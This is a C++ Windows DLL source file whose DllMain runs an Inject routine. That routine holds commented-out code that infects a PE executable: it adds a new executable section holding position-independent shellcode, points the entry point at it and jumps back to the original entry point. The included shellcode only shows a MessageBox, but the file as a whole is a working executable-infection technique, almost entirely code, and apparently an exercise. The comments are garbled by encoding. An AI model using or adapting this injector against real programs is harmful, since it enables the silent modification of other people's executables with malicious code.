#include<Windows.h>
wchar_t path[MAX_PATH] = L"test.exe";
//unsigned char shellcode[] = {
//	0x31,0xc9,0x64,0x8b,0x41,0x30,0x8b,0x40,0xc,0x8b,0x70,0x14,0xad,0x96,0xad,0x8b,
//	0x58,0x10,0x8b,0x53,0x3c,0x1,0xda,0x8b,0x52,0x78,0x1,0xda,0x8b,0x72,0x20,0x1,
//	0xde,0x31,0xc9,0x41,0xad,0x1,0xd8,0x81,0x38,0x47,0x65,0x74,0x50,0x75,0xf4,0x81,
//	0x78,0x4,0x72,0x6f,0x63,0x41,0x75,0xeb,0x81,0x78,0x8,0x64,0x64,0x72,0x65,0x75,
//	0xe2,0x8b,0x72,0x24,0x1,0xde,0x66,0x8b,0xc,0x4e,0x49,0x8b,0x72,0x1c,0x1,0xde,
//	0x8b,0x14,0x8e,0x1,0xda,0x31,0xc9,0x53,0x52,0x51,0x68,0x61,0x72,0x79,0x41,0x68,
//	0x4c,0x69,0x62,0x72,0x68,0x4c,0x6f,0x61,0x64,0x54,0x53,0xff,0xd2,0x83,0xc4,0xc,
//	0x59,0x50,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x68,0x33,0x32,0x2e,0x64,0x68,0x75,
//	0x73,0x65,0x72,0x54,0xff,0x54,0x24,0x10,0x83,0xc4,0xc,0x50,0x31,0xc0,0xb8,0x6f,
//	0x78,0x41,0x23,0x50,0x83,0x6c,0x24,0x3,0x23,0x68,0x61,0x67,0x65,0x42,0x68,0x4d,
//	0x65,0x73,0x73,0x54,0xff,0x74,0x24,0x10,0xff,0x54,0x24,0x1c,0x83,0xc4,0xc,0x50,
//	0x31,0xc0,0x50,0x68,0x6d,0x70,0x6c,0x65,0x68,0x20,0x65,0x78,0x61,0x68,0x65,0x42,
//	0x6f,0x78,0x68,0x73,0x73,0x61,0x67,0x68,0x61,0x20,0x4d,0x65,0x68,0x20,0x69,0x73,
//	0x20,0x68,0x54,0x68,0x69,0x73,0x54,0x31,0xc0,0x66,0xb8,0x65,0x72,0x50,0x68,0x6d,
//	0x70,0x69,0x6c,0x68,0x65,0x20,0x43,0x6f,0x68,0x6c,0x63,0x6f,0x64,0x68,0x53,0x68,
//	0x65,0x6c,0x54,0x31,0xc0,0x50,0xff,0x74,0x24,0x4,0xff,0x74,0x24,0x20,0x31,0xc0,
//	0x50,0xff,0x54,0x24,0x4c,0x83,0xc4,0x3c };

struct INJINFO
{
	char path[MAX_PATH];
	int size;
};
unsigned char jmpOldOep[] = {
	0xE9, 0x00, 0x00, 0x00, 0x00
};

DWORD Aligment(DWORD dwSize, DWORD dwAlig)
{
	return (dwSize%dwAlig == 0) ? dwSize : (dwSize / dwAlig + 1)*dwAlig;
}


__declspec(dllexport) void __cdecl Inject()
{
	INJINFO injinfo;
	ZeroMemory(&injinfo, sizeof(injinfo));
	char *baseaddr=NULL;
	_asm
	{
		call get_delta_offset
		get_delta_offset:
		pop baseaddr
	}
	//HANDLE hFile = CreateFile(path, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//if (INVALID_HANDLE_VALUE == hFile)
	//{
	//	//printf("createfile error");
	//	//getchar();
	//	return;
	//}
	////int filesize = GetFileSize(hFile, NULL);
	////char* lpMemory = new char[filesize];
	////DWORD RSize=0;
	////ReadFile(hFile, lpMemory,filesize,&RSize, NULL);

	//HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	//if (NULL == hFileMap)
	//{
	//	//printf("CreateFileMapping error");
	//	//getchar();
	//	CloseHandle(hFile);
	//	CloseHandle(hFileMap);
	//	return;
	//}
	//LPVOID lpMemory = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	//if (NULL == lpMemory)
	//{
	//	//printf("CreateFileView error");
	//	//getchar();
	//	CloseHandle(hFileMap);
	//	CloseHandle(hFile);
	//	return;
	//}
	//PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMemory;    //��ȡDOSͷ
	//PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)lpMemory + pDosHeader->e_lfanew); //��ȡNTͷ
	//if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNTHeader->Signature != IMAGE_NT_SIGNATURE)  //�ж�PE
	//{
	//	//printf("not PE");
	//	//getchar();
	//	return;
	//}
	//PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNTHeader->FileHeader;  //ͨ��NTͷ��ȡ�ļ�ͷ
	//PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNTHeader->OptionalHeader; //ͨ��NTͷ��ȡ��ѡ�ļ�ͷ
	//PIMAGE_SECTION_HEADER pFirstSectiongHeader = IMAGE_FIRST_SECTION(pNTHeader);  //ͨ��NTͷ��ȡ��һ���ڱ�ͷ
	//int sectionNum = pFileHeader->NumberOfSections++;                             //�ڱ�����һ
	//PIMAGE_SECTION_HEADER pLastSectionHeader = pFirstSectiongHeader + sectionNum; //ͨ����һ���ڱ�ͷ��ȡ�¼ӵ�һ���ڱ�ͷ
	//DWORD dwFileAlig = pOptionalHeader->FileAlignment;
	//DWORD dwMemAlig = pOptionalHeader->SectionAlignment;
	//memcpy(pLastSectionHeader->Name, ".code", 7);
	//pLastSectionHeader->Misc.VirtualSize = sizeof(shellcode);
	//pLastSectionHeader->SizeOfRawData = Aligment(sizeof(shellcode), dwFileAlig);
	//pLastSectionHeader->VirtualAddress = (pLastSectionHeader - 1)->VirtualAddress + Aligment((pLastSectionHeader - 1)->SizeOfRawData, dwMemAlig);  //����ƫ��
	//pLastSectionHeader->PointerToRawData = Aligment((pLastSectionHeader - 1)->PointerToRawData + (pLastSectionHeader - 1)->Misc.VirtualSize, dwFileAlig); //�ļ�ƫ��
	//pLastSectionHeader->Characteristics = 0xE0000060;
	//pOptionalHeader->SizeOfImage = Aligment(pLastSectionHeader->VirtualAddress + pLastSectionHeader->SizeOfRawData, dwMemAlig);
	////�޸���ڵ�
	//DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
	//DWORD jmpOffest = oldOep - (pLastSectionHeader->VirtualAddress + sizeof(shellcode)) - sizeof(jmpOldOep);
	//pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
	//*(DWORD*)&jmpOldOep[1] = jmpOffest;
	////�޸��ļ�
	//int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
	//char* pNewFile = new char[newFileSize];
	//ZeroMemory(pNewFile, newFileSize);
	//memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
	//memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
	////���תָ��
	//memcpy(pNewFile + pLastSectionHeader->PointerToRawData + sizeof(shellcode), jmpOldOep, sizeof(jmpOldOep));
	////д���ļ�
	//DWORD dwWrite = 0;
	//WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
	//delete[] pNewFile;
	////delete[] lpMemory;
	//CloseHandle(hFileMap);
	//CloseHandle(hFile);

}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		Inject();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}